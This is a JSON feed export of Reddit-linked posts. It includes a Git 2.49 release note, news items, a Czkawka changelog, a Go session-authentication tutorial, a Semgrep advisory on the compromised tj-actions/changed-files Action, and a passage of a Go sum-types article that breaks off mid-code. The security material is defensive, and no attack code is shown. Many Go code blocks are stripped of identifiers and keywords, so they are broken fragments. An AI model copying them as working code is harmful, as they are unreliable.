the codebase.\n</p><p>This first bit of Rust code within Git introduces two new Rust crates: libgit-sys and libgit. Further work on Rust code within Git is being carried out for future Git releases.\n</p>Download and more details on the Git 2.49 release via the <a href=\"https://lore.kernel.org/lkml/xmqqfrjfilc8.fsf@gitster.g/\">release announcement</a>. Over on the <a href=\"https://github.blog/open-source/git/highlights-from-git-2-49/\">GitHub blog</a> are also more details on the Git 2.49 changes.","contentLength":820,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1jcipav/git_249_released_with_faster_packing_rust_foreign/"},{"title":"Finland turns down US request for eggs | Yle News","url":"https://yle.fi/a/74-20149786","date":1742119536,"author":"/u/redditforcedmesignup","guid":397,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/europe/comments/1jci953/finland_turns_down_us_request_for_eggs_yle_news/"},{"title":"Hungarian Opposition Rallies in Massive Protest Against Orbán’s Rule","url":"https://www.kyivpost.com/post/48992","date":1742119318,"author":"/u/Yveliad","guid":387,"unread":true,"content":"<p>Massive crowds rallied in Budapest on Saturday as Hungarian opposition activists came out in force to call for an end to Prime Minister Viktor Orbán’s 15-year rule.</p><p>Around 50,000 protesters descended on the capital on Hungary’s national day to support Peter Magyar, a former government insider turned leader of the anti-Orbán camp.</p><p>Magyar told his supporters the “time has come” for his Tisza party, which is leading the prime minister’s Fidesz party in most opinion polls ahead of elections in 2026, Reuters reported.</p><p>Speaking to TVP World during the demonstration, Tisza’s deputy chair Zoltán Tarr said that his movement faced significant operational challenges under the current government, which has been accused of undermining press freedom and curbing democracy.</p><p>“The biggest challenge is that Orbán’s government is doing everything in its power to somehow control and limit our activities,” Tarr claimed.</p><p>“They also go after people who openly say that they want change and say that they would like to belong to the Tisza movement. That is one of the biggest challenges, because obviously everyone is worried about his or her own existence, and this government is very particular in going after people one by one, singling them out.”</p><p>He added that state “propaganda” was spreading falsehoods about the opposition.</p><p>“They constantly make up stories which are not true but which are able to lead people in a different direction, [they] mislead them by spreading lies about us,” he said.</p><p>Magyar and his party are set to launch a popular survey on 12 key economic and political issues to give citizens a voice in the movement’s political platform in the run-up to next year’s vote.</p><p>The 43-year-old MEP has also vowed to make Hungary part of a strong Europe, in contrast to Orbán’s Euroscepticism, which has seen him regularly clashing with politicians in Brussels and other European capitals.</p><p>Speaking at a separate rally on Saturday, the 61-year-old Orbán said it was time to eliminate what he called a “shadow army” of NGOs, journalists, judges and politicians receiving payments from abroad.</p><p>He has already announced plans to crack down on organizations funded by the U.S. Agency for International Development (USAID) – which is now being dismantled by Trump – and Budapest-born billionaire George Soros, a supporter of liberal causes.</p><p>This week Orbán’s Fidesz party submitted constitutional changes that would permit the expulsion of dual citizens deemed to pose a threat to Hungary’s sovereignty.</p><p>While the Tisza movement may be riding high in recent polls, unseating Orbán would be a significant achievement. In the last parliamentary elections in 2022, a united front of anti-Fidesz candidates fell well short of Orbán’s party, which won over half of the popular vote.</p>","contentLength":2822,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jci7c2/hungarian_opposition_rallies_in_massive_protest/"},{"title":"Introducing Eventure: A Powerful Event-Driven Framework for Python","url":"https://github.com/enricostara/eventure","date":1742117051,"author":"/u/jumpixel","guid":566,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jchp7w/introducing_eventure_a_powerful_eventdriven/"},{"title":"Czkawka/Krokiet 9.0 — Find duplicates faster than ever before","url":"https://www.reddit.com/r/linux/comments/1jchp31/czkawkakrokiet_90_find_duplicates_faster_than/","date":1742117035,"author":"/u/krutkrutrar","guid":719,"unread":true,"content":"<p>Today I released new version of my apps to deduplicate files - Czkawka/Krokiet 9.0 </p><p>The current version primarily focuses on refining existing features and improving performance rather than introducing any spectacular new additions.</p><p>With each new release, it seems that I am slowly reaching the limits — of my patience, Rust’s performance, and the possibilities for further optimization.</p><p>Czkawka is now at a stage where, at first glance, it’s hard to see what exactly can still be optimized, though, of course, it’s not impossible.</p><ul><li>Video, Duplicate (smaller prehash size), and Image cache (EXIF orientation + faster resize implementation) are incompatible with previous versions and need to be regenerated.</li></ul><ul><li>Automatically rotating all images based on their EXIF orientation</li><li>Fixed a crash caused by negative time values on some operating systems</li><li>Updated `vid_dup_finder`; it can now detect similar videos shorter than 30 seconds</li><li>Added support for more JXL image formats (using a built-in JXL → image-rs converter)</li><li>Improved duplicate file detection by using a larger, reusable buffer for file reading</li><li>Added an option for significantly faster image resizing to speed up image hashing</li><li>Logs now include information about the operating system and compiled app features(only x86_64 versions)</li><li>Added size progress tracking in certain modes</li><li>Ability to stop hash calculations for large files mid-process</li><li>Implemented multithreading to speed up filtering of hard links</li><li>Reduced prehash read file size to a maximum of 4 KB</li><li>Fixed a slowdown at the end of scans when searching for duplicates on systems with a high number of CPU cores</li><li>Improved scan cancellation speed when collecting files to check</li><li>Added support for configuring config/cache paths using the `CZKAWKA_CONFIG_PATH` and `CZKAWKA_CACHE_PATH` environment variables</li><li>Fixed a crash in debug mode when checking broken files named `.mp3`</li><li>Catching panics from symphonia crashes in broken files mode</li><li>Printing a warning, when using `panic=abort`(that may speedup app and cause occasional crashes)</li></ul><ul><li>Changed the default tab to “Duplicate Files”</li></ul><ul><li>Added a window icon in Wayland</li><li>Disabled the broken sort button</li></ul><ul><li>Added `-N` and `-M` flags to suppress printing results/warnings to the console</li><li>Fixed an issue where messages were not cleared at the end of a scan</li><li>Ability to disable cache via `-H` flag(useful for benchmarking)</li></ul><ul><li>This release is last version, that supports Ubuntu 20.04 github actions drops this OS in its runners</li><li>Linux and Mac binaries now are provided with two options x86_64 and arm64</li><li>Arm linux builds needs at least Ubuntu 24.04</li><li>Gtk 4.12 is used to build windows gtk gui instead gtk 4.10</li><li>Dropping support for snap builds — too much time-consuming to maintain and testing(also it is broken currently)</li><li>Removed native windows build krokiet version — now it is available only cross-compiled version from linux(should not be any difference)</li></ul><p>In the next version, I will likely focus on implementing missing features in Krokiet that are already available in Czkawka, such as selecting multiple items using the mouse and keyboard or comparing images.</p><p>Although I generally view the transition from GTK to Slint positively, I still encounter certain issues that require additional effort, even though they worked seamlessly in GTK. This includes problems with popups and the need to create some widgets almost from scratch due to the lack of documentation and examples for what I consider basic components, such as an equivalent of GTK’s TreeView.</p><p>Price — free, so take it for yourself, your friends, and your family. Licensed under MIT/GPL</p>","contentLength":3559,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Czkawka/Krokiet 9.0 — Find duplicates faster than ever before","url":"https://www.reddit.com/r/rust/comments/1jchjc4/czkawkakrokiet_90_find_duplicates_faster_than/","date":1742116298,"author":"/u/krutkrutrar","guid":373,"unread":true,"content":"<p>Today I released new version of my apps to deduplicate files - Czkawka/Krokiet 9.0</p><p>The current version primarily focuses on refining existing features and improving performance rather than introducing any spectacular new additions.</p><p>With each new release, it seems that I am slowly reaching the limits — of my patience, Rust’s performance, and the possibilities for further optimization.</p><p>Czkawka is now at a stage where, at first glance, it’s hard to see what exactly can still be optimized, though, of course, it’s not impossible.</p><ul><li>Video, Duplicate (smaller prehash size), and Image cache (EXIF orientation + faster resize implementation) are incompatible with previous versions and need to be regenerated.</li></ul><ul><li>Automatically rotating all images based on their EXIF orientation</li><li>Fixed a crash caused by negative time values on some operating systems</li><li>Updated `vid_dup_finder`; it can now detect similar videos shorter than 30 seconds</li><li>Added support for more JXL image formats (using a built-in JXL → image-rs converter)</li><li>Improved duplicate file detection by using a larger, reusable buffer for file reading</li><li>Added an option for significantly faster image resizing to speed up image hashing</li><li>Logs now include information about the operating system and compiled app features(only x86_64 versions)</li><li>Added size progress tracking in certain modes</li><li>Ability to stop hash calculations for large files mid-process</li><li>Implemented multithreading to speed up filtering of hard links</li><li>Reduced prehash read file size to a maximum of 4 KB</li><li>Fixed a slowdown at the end of scans when searching for duplicates on systems with a high number of CPU cores</li><li>Improved scan cancellation speed when collecting files to check</li><li>Added support for configuring config/cache paths using the `CZKAWKA_CONFIG_PATH` and `CZKAWKA_CACHE_PATH` environment variables</li><li>Fixed a crash in debug mode when checking broken files named `.mp3`</li><li>Catching panics from symphonia crashes in broken files mode</li><li>Printing a warning, when using `panic=abort`(that may speedup app and cause occasional crashes)</li></ul><ul><li>Changed the default tab to “Duplicate Files”</li></ul><ul><li>Added a window icon in Wayland</li><li>Disabled the broken sort button</li></ul><ul><li>Added `-N` and `-M` flags to suppress printing results/warnings to the console</li><li>Fixed an issue where messages were not cleared at the end of a scan</li><li>Ability to disable cache via `-H` flag(useful for benchmarking)</li></ul><ul><li>This release is last version, that supports Ubuntu 20.04 github actions drops this OS in its runners</li><li>Linux and Mac binaries now are provided with two options x86_64 and arm64</li><li>Arm linux builds needs at least Ubuntu 24.04</li><li>Gtk 4.12 is used to build windows gtk gui instead gtk 4.10</li><li>Dropping support for snap builds — too much time-consuming to maintain and testing(also it is broken currently)</li><li>Removed native windows build krokiet version — now it is available only cross-compiled version from linux(should not be any difference)</li></ul><p>In the next version, I will likely focus on implementing missing features in Krokiet that are already available in Czkawka, such as selecting multiple items using the mouse and keyboard or comparing images.</p><p>Although I generally view the transition from GTK to Slint positively, I still encounter certain issues that require additional effort, even though they worked seamlessly in GTK. This includes problems with popups and the need to create some widgets almost from scratch due to the lack of documentation and examples for what I consider basic components, such as an equivalent of GTK’s TreeView.</p><p>Price — free, so take it for yourself, your friends, and your family. Licensed under MIT/GPL</p>","contentLength":3558,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Finland turns down US request for eggs","url":"https://yle.fi/a/74-20149786","date":1742116052,"author":"/u/Beo1217","guid":394,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jchh9z/finland_turns_down_us_request_for_eggs/"},{"title":"Session-Based Authentication in Go","url":"https://themsaid.com/session-authentication-go","date":1742114173,"author":"/u/themsaid","guid":724,"unread":true,"content":"<p>Earlier, we explored <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">session management in Go web applications</a>, followed by a deep dive into <a href=\"https://themsaid.com/csrf-protection-go-web-applications\" rel=\"nofollow\">CSRF protection</a>. Drawing from my decade of experience building web applications with Laravel, I've found that good old session-based authentication remains the most convenient and secure way to authenticate users. It strikes the perfect balance between simplicity and security, making it an approach I trust for building reliable web apps.</p><p>The idea behind session-based authentication is simple:</p><div><pre>Client                                    Server\n  |                                          |\n  |   User visits the web app              |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server creates a session  sends   |\n  |     its  back                          |\n  | &lt;--------------------------------------- |\n  |                                          |\n  |   User submits login form              |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server verifies credentials and      |\n  |     stores the user identifier in the    |\n  |     session                              |\n  |                                          |\n  |   Server sends a success response      |\n  | &lt;----------------------------------------|\n  |                                          |\n  |   Client makes authenticated requests  |\n  |     (Cookie is automatically sent)       |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server retrieves session data     |\n  |     extracts the user identifier         |\n  |                                          |\n  |   Server processes request          |\n  |     responds                             |\n  | &lt;----------------------------------------|</pre></div><p>When a session is first created, before the visitor submits the login form, it is known as an . At this stage, the session is not yet linked to a specific user, but it can still store temporary data that enhances the user experience.</p><p>For example, in an e-commerce application, an unauthenticated session can store items added to a shopping cart before the user logs in. In a blog or forum, an unauthenticated session might be used to save a visitor’s draft comments before they sign up. In general, unauthenticated sessions can be used to store flash messages, such as \"Item added to cart\" or \"Invalid login credentials\".</p><p>Once the login form is submitted and the user's identity is verified, storing the user identifier in the session converts it into an . Each time the client sends the cookie containing the session ID, the server uses it to identify the associated user and tailor the response accordingly.</p><p>The first step in implementing an authentication mechanism in our web application is to enable user registration. During this process, a user typically provides an email or username along with a password. The server then performs input sanitization and various validation checks to ensure the credentials are secure, properly formatted, and unique.</p><p>Once these checks are passed, the server securely stores the user’s credentials, often hashing the password using a strong algorithm like  or  before saving it to the database.</p><p>Since the scope of this articles covers only the authentication part, we'll skip input validation and sanitization and focus on hashing the password and storing it in a database:</p><div><pre> (\n\t\n)\n\n(\n    sql., \n    , \n    ,\n)  {\n\t, .(\n\t\t[](),\n\t\t.,\n\t)\n\t {\n\t\t\n\t}\n\n\t\n}</pre></div><p>The first step in our  method is to generate a secure hash for the provided password using the  package. This is a crucial security measure that helps protect user credentials in case the database is ever compromised. Hashing passwords ensures that even if an attacker, or a rogue employee, gains access to the database, they cannot easily retrieve the original password.</p><p>The  algorithm includes a cost factor, which controls how computationally expensive it is to hash a password and verify it later. A higher cost factor increases security by making brute-force attacks more difficult, but it also slows down the hashing process.</p><p>In our example, we use the default cost of 10, which strikes a good balance between security and performance. Popular frameworks, such as Laravel, set the default cost to 12 for added protection.</p><p>Next, we'll store the  along with the  in the database:</p><div><pre>,  bcrypt.()\n\n\n\n_, .(\n    ,\n    ,\n    ,\n)\n {\n    \n}</pre></div><p>With this in place, we now have a record in the database that allows us to verify user credentials when they attempt to log in.</p><p>For session-based authentication, the login process consists of two key steps:</p><ol><li>Verify that the user exists and the provided password matches the stored hash.</li><li>Store the authenticated user's information in the session to maintain their logged-in state.</li></ol><p>In the first step, we retrieve the user record from the database using the provided username and compare the given password with its hashed version. We do that in a  function:</p><div><pre>(\n\tsql.,\n\t,\n\t,\n)  {\n\t.(\n\t\t,\n\t\t,\n\t).()\n\t {\n\t\t.(, )\n\t}\n\n\t.(\n\t\t[](),\n\t\t[](),\n\t)\n\t {\n\t\t.(, )\n\t}\n\n    \n}</pre></div><p>The <code>bcrypt.CompareHashAndPassword</code> function allows us to verify whether a given plain-text password () matches a bcrypt-hashed password (). Since the bcrypt algorithm generates a unique salt for each hash, hashing the same password multiple times will always produce different results. This means we cannot simply hash the plain password and compare it directly to the stored hash in a database query. Instead,  extracts the salt from the stored hash and uses it to perform the comparison securely.</p><p>Next, for storing the user in the session, we will add a  function:</p><div><pre>(\n\thttp.,\n\t,\n\t,\n)  {\n\t()\n\n\t.()\n\t {\n\t\t.(, )\n\t}\n\n\t.(, )\n\n\t\n}</pre></div><p>The  function takes in the request, the session manager, and the username. It retrieves the session from the request using the  function (which we covered in a <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">previous article</a>), then migrates the session by deleting the existing session from the session store, assigning a new session ID, and generating a fresh CSRF token. Finally, it stores the username in the session to maintain the user's authenticated state.</p><p>Generating a new session ID when a user's privilege level changes is crucial for protecting against session fixation attacks. Without this step, an attacker could inject a known session ID into the user's session cookie before they authenticate, and then reuse this session ID after the user logs in. This would grant the attacker unauthorized access to the user's account.</p><p>The  method looks like this:</p><div><pre> () ()  {\n\t..(.)\n\t {\n\t\t\n\t}\n\n\t.()\n\t.(, ())\n\n\t\n}</pre></div><p>As you can see, the old session is deleted while the in-memory session instance gets a new session ID and .</p><p>Before sending the response, the session manager's middleware will include the new session ID in the response, and store the session as a new entry in our session store. For a deeper dive into how this works, refer to the <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">earlier article</a>.</p><p>To log a user out, we must migrate the session and remove the  from the session data:</p><div><pre>(\n\thttp.,\n\t,\n)  {\n\t()\n\n\t.()\n\t {\n\t\t.(, )\n\t}\n\n\t.(, )\n\n\t\n}</pre></div><p>By migrating the session, we ensure that the existing authenticated session is removed from the session store and a new one is created with the same session data. In the  function, we remove the  from the session to effectively convert it into an unauthenticated session. If any other critical information is stored in the session, it should also be removed. However, keeping non-critical session data, such as user preferences or timezone settings, can help provide a smooth user experience.</p><div><h2>Authentication Middleware</h2><a aria-label=\"Permalink: Authentication Middleware\" href=\"https://themsaid.com/session-authentication-go#authentication-middleware\"></a></div><p>Now, we’ll add middleware to protect handlers from unauthenticated access. Within the middleware, we’ll query the database to verify that the username stored in the session exists, ensuring the session belongs to a valid user:</p><div><pre>(sql.,  http.) http. {\n\t.(( http., http.) {\n\t\t()\n\n\t\t.().()\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\n\t\t.(\n\t\t\t,\n\t\t\t,\n\t\t).()\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\t})\n}</pre></div><p>As you might have guessed, this middleware must run <strong>after the session has been added to the request</strong>. In other words, the session manager's middleware must execute before the authentication middleware. Otherwise, the authentication middleware will panic when calling the  function, as it expects the session to be present in the request context.</p><div><pre>(http.)  {\n\t, .().({}).()\n\t {\n\t\t()\n\t}\n\n\t\n}</pre></div><p>In our middleware, we respond with a  error if authentication fails. Alternatively, you could choose to redirect the user to a  page, allowing them to enter their credentials and start a new authenticated session.</p><div><h2>Preventing Timing Attacks</h2><a aria-label=\"Permalink: Preventing Timing Attacks\" href=\"https://themsaid.com/session-authentication-go#preventing-timing-attacks\"></a></div><p>When handling login requests, it's best practice to ensure the authentication process takes a constant amount of time, regardless of whether the credentials are correct or not. This helps prevent timing attacks, which is a type of attacks where an attacker measures the time it takes for the server to respond and uses that information to infer sensitive data, such as valid usernames or partial password matches.</p><p>To protect against timing attacks, we'll start a timer at the beginning of our handler and invoke a  call to ensure the handler responds exactly after a certain duration:</p><div><pre>.(, ( http., http.) {\n    ..()\n\n    .(\n        ,\n        .(),\n        .(),\n    )\n     {\n        .(, , .())\n    }\n\n    .().()  {\n        .(.().())\n    }\n\n     {\n        .(, , .)\n        \n    }\n\n    .(, , , .)\n})</pre></div><p>Here, we set the handler's duration to 1 second, but you can adjust this based on your application's performance needs and the desired user experience. Next, we call the  function to check if the provided credentials are valid. If they are, we proceed with the  function.</p><p>Before returning either a success or failure response, we measure the elapsed time and call  if it’s less than 1 second, ensuring a consistent response time to mitigate timing attacks.</p><p>By storing the authenticated user identifier in the session, we can easily differentiate between authenticated and non-authenticated sessions. This allows us to retrieve user information at any point during the request lifecycle, ensuring that we can verify and tailor responses based on the user's authentication status.</p><p>The process is simple: we begin by extracting the session from the request, and then check the username session attribute:</p><div><pre>()\n\n.().()\n {\n    \n}  {\n    \n}</pre></div><p>If the username exists, it indicates that the session is authenticated, and we can proceed to access relevant user data. If not, we know that the session is not authenticated, and we can prompt the user to log in.</p>","contentLength":10531,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jch2ts/sessionbased_authentication_in_go/"},{"title":"\"Gunyah Hypervisor Software - Supporting Protected VMs in Android Virtualization Framework\" by Elliot Berman and \"Co-written with Prakruthi Deepak Heragu\" (January 28, 2024)","url":"https://www.qualcomm.com/developer/blog/2024/01/gunyah-hypervisor-software-supporting-protected-vms-android-virtualization-framework","date":1742114152,"author":"/u/throwaway16830261","guid":565,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jch2nr/gunyah_hypervisor_software_supporting_protected/"},{"title":"A work by Ben Jennings for The i Paper","url":"https://www.reddit.com/r/europe/comments/1jcgv2h/a_work_by_ben_jennings_for_the_i_paper/","date":1742113165,"author":"/u/CorleoneBaloney","guid":720,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Popular GitHub Action `tj-actions/changed-files` has been compromised with a payload that appears to attempt to dump secrets","url":"https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/","date":1742106264,"author":"/u/alexeyr","guid":409,"unread":true,"content":"<p>Popular GitHub Action <a rel=\"noopener noreferrer\" href=\"https://github.com/tj-actions/changed-files\">tj-actions/changed-files</a>&nbsp;has been compromised (<a rel=\"noopener noreferrer\" href=\"https://github.com/tj-actions/changed-files/issues/2463\">GitHub issue</a>) with a payload that appears to attempt to dump secrets, impacting thousands of CI pipelines.&nbsp;This isn’t the first security issue with tj-actions/changed-files—see prior vulnerability <a rel=\"noopener noreferrer\" href=\"https://www.cve.org/CVERecord?id=CVE-2023-51664\">CVE-2023-51664</a>.</p><ol start=\"2\"><li><p> Switch to a safer alternative or inline your file-change detection logic.</p><ol start=\"1\"><li><p>Just removing it from the main branch of your repository won’t be enough — it could still run on other branches depending on how your actions are configured. So you need to remove it from  branches to be safe.</p></li><li><ol start=\"1\"><li><p>You’ll need a list of GitHub Actions used at your org. Run this query on your codebase:</p><pre><code>$ semgrep -e 'uses: $ACTION' -l yaml --json .github  | jq -r '.results[].extra.metavars[\"$ACTION\"].abstract_content' | grep -vE '^(actions/|docker://|[.]/[.]github/|tj-actions/)' | awk -F'@' '{print $1 \"@*,\"}' | sort | uniq\nDataDog/synthetics-ci-github-action@*,\nactions-rs/toolchain@*,\nastral-sh/setup-uv@*,\naws-actions/amazon-ecr-login@*,</code></pre></li><li><p>Remove tj-actions/changed-files from the list of GitHub Actions.</p></li></ol></li><li><p><strong>Generally, pin all GitHub Actions to specific commit SHAs (rather than version tags) you know are safe.</strong> In this case, it appears that all versions are compromised.</p></li><li><p><strong>Audit past workflow runs for signs of compromise.</strong> Check logs for suspicious outbound network requests. Prioritize repos where your CI runner logs are public, as secrets are dumped to stdout in the payload.</p></li></ol></li></ol>","contentLength":1435,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcfchv/popular_github_action_tjactionschangedfiles_has/"},{"title":"When a junior/entry SWE job lists Kubernetes & Docker what do they expect you to know?","url":"https://www.reddit.com/r/kubernetes/comments/1jceuxe/when_a_juniorentry_swe_job_lists_kubernetes/","date":1742104196,"author":"/u/Bobsthejob","guid":370,"unread":true,"content":"<p>If its not a DevOps job, but for example I have seen some backend dev jobs where as part of the requirements they list the usual CI/CD best practices, and Docker, and K8s ~ but what do they actually expect you to know in an interview for K8s? Thanks (edit explanation)</p>","contentLength":268,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Decoding JSON sum types in Go without panicking","url":"https://nicolashery.com/decoding-json-sum-types-in-go/","date":1742100126,"author":"/u/FoxInTheRedBox","guid":405,"unread":true,"content":"<p><em>The Go programming language doesn't have native support for sum types, but we'll see how we can emulate them, how to decode and encode them into JSON, and how in some cases they can help avoid runtime panic exceptions.</em></p><h2 tabindex=\"-1\">Whether we find them useful or not, sum types exist</h2><p>Many languages support sum types natively: <a href=\"https://zig.guide/language-basics/unions/\">Zig</a>, <a href=\"https://www.typescriptlang.org/docs/handbook/2/narrowing.html#discriminated-unions\">TypeScript</a>, <a href=\"https://ocaml.org/docs/basic-data-types#variants\">OCaml</a>, <a href=\"https://doc.rust-lang.org/book/ch06-00-enums.html\">Rust</a>, just to name a few. Even <a href=\"https://swagger.io/specification/#discriminator-object\">OpenAPI has them</a>, the de-facto standard and language-agnostic way to define HTTP APIs using JSON. So even if the programming language you're using doesn't natively support sum types, you may still need to handle a JSON payload over the wire that is modeled as one. This requires deciding how to decode that payload in your language of choice.</p><p>Personal feelings about sum types aside, I think most people would agree they effectively model data structures that can be <em>\"one of these (potentially very different) things, and nothing else\"</em>. And once you've experienced sum types with a  or match expression combined with , it's hard to go back.</p><p>Let's take a primitive type, a boolean or  in Rust. It has 2 possible values:  or  (also called \"cardinality\"). A struct or record is called a  because you can count the number of possible values (or cardinality) by  the number of possible values of each field. So if I have a struct with 2 boolean fields (example here in Rust):</p><pre><code>\n    signed_up\n    subscribed</code></pre><p>The number of possible values for this struct (or \"product type\") is: 2x2 = .</p><p>Now I didn't choose this struct example completely at random. Some of the possible values are not valid in this particular domain: a user can't be  if they are not  as well. You'll also hear the phrase \"make illegal states unrepresentable\" when talking about sum types.</p><p>A  is called that way because... you guessed it. You can count the number of possible values (or cardinality) by  the number of possible values of each branch. So if I have the following sum type (example still in Rust, where they are called \"enums\"):</p><pre><code> subscribed</code></pre><p>The number of possible values for this \"sum type\" is: 1+2 = .</p><p>I'll leave it as an exercise to the reader to discuss and decide which of these two data structures is better adapted for representing this particular domain.</p><h2 tabindex=\"-1\">My first nil pointer panic in Go was due to lack of sum types</h2><p>Ok, that section title is a bit cheeky and probably not entirely true. But when I figured out what caused the panic in my code, the thought \"sum types would've caught this at compile time\"  cross my mind. I'm sure the astute reader could find better ways to structure my first implementation, even without sum types. But humor me for the sake of this article.</p><p>Let me say it now: This is  one of those \"Go should have sum types\" post. A lot has already been written on the topic and I don't want to get into the debate (although you'll probably guess where I stand). Let's just assume I want to  something like sum types in Go, then:</p><ol><li>How do I do so without straying too far from what's idiomatic in the language?</li><li>How do I encode and decode it, to and from JSON, with the structure we'll see below?</li></ol><p>This post is also  a criticism of Go. I came across this issue in my first Go project, and I actually enjoyed working with the language. Having shied away from Go for a while (notably because of lack of sum types), I finally gave it a try because it seemed a good fit for this project. The fast compile times, robust standard library, simplicity of the language, and great developer tooling all delivered on their promise.</p><p>For the anecdote, the first time I ran  was on the sample codebase from <a href=\"https://lets-go-further.alexedwards.net/\">Alex Edward's \"Let's Go Further\" book</a> (excellent book by the way), and I had to run it again because it was so much faster than what I was used to ( Haskell ), I thought nothing had happened.</p><p>Back to the historical context: I'm feeling very productive with Go on this particular project. The feedback loop is amazing, and I have a working proof-of-concept in just a couple of days. Code seems to just slip from my fingers, everything works on the first try, zero values and pointers do not scare me anymore, I just need to add this last thing and... then it hits me:</p><pre><code>2024/12/07 12:16:53 http: panic serving [::1]:60984:\nruntime error: invalid memory address or nil pointer dereference\ngoroutine 4 [running]:\nnet/http.(*conn).serve.func1()\n    /usr/local/go/src/net/http/server.go:1947 +0xb0\npanic({0x100a00f00?, 0x100f19b00?})\n    /usr/local/go/src/runtime/panic.go:785 +0x124\nexample/main.TransformAction(0x14000115e08)\n    /Users/nicolashery/dev/example/main.go:110 +0x1c\nexample/main.(*Server).handleTransformActions(0x140001cad80, {0x100ad6358, 0x14000160380}, 0x140001597c0)\n    /Users/nicolashery/dev/example/main.go:157 +0x20c\n[...]</code></pre><p>Ouch. Having done a lot of Haskell and (strict) TypeScript recently, I had forgotten one could get such runtime errors. But I don't panic (pun intended), and I carefully look at the code mentioned in the stack trace.</p><p>Below is a simplified version of the code for the sake of this article (the actual implementation had bigger structures and more cases). Can you spot the error? You have 5 seconds.</p><pre><code>a Action result  aType  ActionType_CreateObject\n\t\tresult  fmt aObjectType aObjectID aObjectName ActionType_UpdateObject\n\t\tresult  fmt aObjectType aObjectID aObjectName ActionType_DeleteObject\n\t\tresult  fmt aObjectID ActionType_DeleteAllObjects\n\t\tresult  result\n</code></pre><p>Ok, obviously you'll want to  on  to see what it is:</p><pre><code> Action \n\tType   ActionType \n\tObject Object    \n\tID     object Object Action  Action\n\t\tType   ActionType_CreateObject\n\t\tObject objectobject Object Action  Action\n\t\tType   ActionType_UpdateObject\n\t\tObject objectid  Action  Action\n\t\tType ActionType_DeleteObject\n\t\tIDid Action  Action\n\t\tType ActionType_DeleteAllObjects</code></pre><p>Did you see the error? If yes, then you can stop reading now and get back to work. I'm joking. Didn't see it in the allowed time limit? Don't worry, the Go type checker couldn't either.</p><h2 tabindex=\"-1\">Decoding JSON sum types in Go, take one</h2><p>How did I get to the code above, you might wonder? Well, imagine our service is receiving a JSON payload that looks like this:</p><pre><code></code></pre><p>These are all different types of \"actions\", and this JSON representation is not unreasonable. The <a href=\"https://swagger.io/specification/#discriminator-object\">OpenAPI specification</a> has a discriminator \"pet\" example, and the <a href=\"https://redocly.com/learn/openapi/discriminator\">Redocly documentation</a> a \"vehicle\" example, that are similar to this. (I have yet to come across an API with pets so apologies my example will be the less fun, but maybe more realistic.)</p><p>My naive attempt to decode this JSON, because I was in a rush (and maybe also because Copilot suggested it, if I'm being honest), was to create a struct which I call . This is a struct with all possible fields for every action type merged, and using pointers. The zero-value of pointers is  which will be set for fields that are \"unused\" by a particular action type. Here it is in all its glory:</p><pre><code> Action \n\tType   ActionType \n\tObject Object    \n\tID      ActionType \n\tActionType_CreateObject     ActionType \n\tActionType_UpdateObject     ActionType \n\tActionType_DeleteObject     ActionType \n\tActionType_DeleteAllObjects ActionType </code></pre><p>This works because  doesn't care if there are missing fields in the JSON payload, it will just set the zero-value for them:</p><pre><code>actions Action err  jsondataactions err  err\n</code></pre><p>We can also go the other way and call  to encode the struct into the same JSON representation as the snippet above. The  struct tag option will remove fields unused by each action type from the resulting JSON.</p><p>So we're off to the races, what can go wrong with a bag of pointers? Subtle bugs when trying to access a field that is  because unused by that action type, that's what:</p><pre><code> aType  ActionType_CreateObject\n\tresult  fmt aObjectType aObjectID aObjectName ActionType_UpdateObject\n\tresult  fmt aObjectType aObjectID aObjectName ActionType_DeleteObject\n\tresult  fmt aObjectID ActionType_DeleteAllObjects\n\tresult </code></pre><h2 tabindex=\"-1\">How do OpenAPI and Protobuf handle this?</h2><p>I pick myself up after this runtime panic, and have the following genius idea: There are code generators for OpenAPI, if I give them the specification for the <a href=\"https://swagger.io/specification/#discriminator-object\">JSON discriminated union</a> above, what do they output for Go? Also, <a href=\"http://protobuf.dev/\">Protocol Buffers</a> is a popular wire format that is based on code generation, and the <a href=\"https://protobuf.dev/programming-guides/editions/#oneof\">Oneof field</a> looks a lot like a sum type, so what do  generate for Go?</p><p>The OpenAPI schema for an action would look like this:</p><pre><code> object\n   type\n     object\n   string\n    </code></pre><p>If I feed this to the <a href=\"https://openapi-generator.tech/\">OpenAPI Generator</a> (note that I'm using the <code>useOneOfDiscriminatorLookup=true</code> option for better output), I get what I'll call a <em>\"bag of all the branches\"</em>:</p><pre><code> Action \n\tcreateObject     CreateObject\n\tupdateObject     UpdateObject\n\tdeleteObject     DeleteObject\n\tdeleteAllObjects DeleteAllObjects\n CreateObject \n\tObject 